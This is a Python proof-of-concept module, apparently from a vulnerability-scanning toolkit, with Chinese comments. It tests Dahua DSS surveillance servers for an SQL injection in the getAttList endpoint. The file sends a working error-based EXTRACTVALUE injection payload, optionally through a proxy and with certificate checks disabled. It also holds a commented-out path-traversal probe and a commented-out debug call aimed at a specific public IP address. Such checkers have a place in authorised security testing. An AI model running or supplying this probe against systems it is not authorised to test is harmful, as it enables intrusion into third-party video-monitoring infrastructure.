import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        gf = requests.get(url+'portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        #gf1 = requests.get(url + 'api/v1/cav/client/status/../../admin/options', cookies=s_cookie, headers=headers, proxies=proxies,verify=False)
        if gf.status_code == 200 and "\qkkkq1qxxbq" in gf.text:
            uia = '[+]漏洞存在\nportal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1'
        # elif gf1.status_code == 200 and "block-message" in gf1.text:
        #     uia = '[+]漏洞存在\napi/v1/cav/client/status/../../admin/options'
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('http://119.1.169.253/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ 大华DSS 数字监控系统 getAttList SQL注入 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)